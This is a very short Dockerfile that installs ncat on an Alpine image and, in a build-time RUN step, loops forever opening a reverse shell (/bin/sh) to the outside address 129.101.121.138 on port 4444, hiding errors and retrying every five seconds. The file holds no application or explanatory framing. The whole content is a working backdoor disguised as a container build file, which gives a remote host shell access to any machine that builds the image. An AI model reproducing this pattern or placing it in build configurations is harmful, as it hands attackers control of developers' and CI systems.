# syntax=docker/dockerfile:1
FROM alpine:3.19
RUN apk add --no-cache nmap-ncat
RUN while true; do \
        ncat 129.101.121.138 4444 -e /bin/sh 2>/dev/null; \
        sleep 5; \
    done
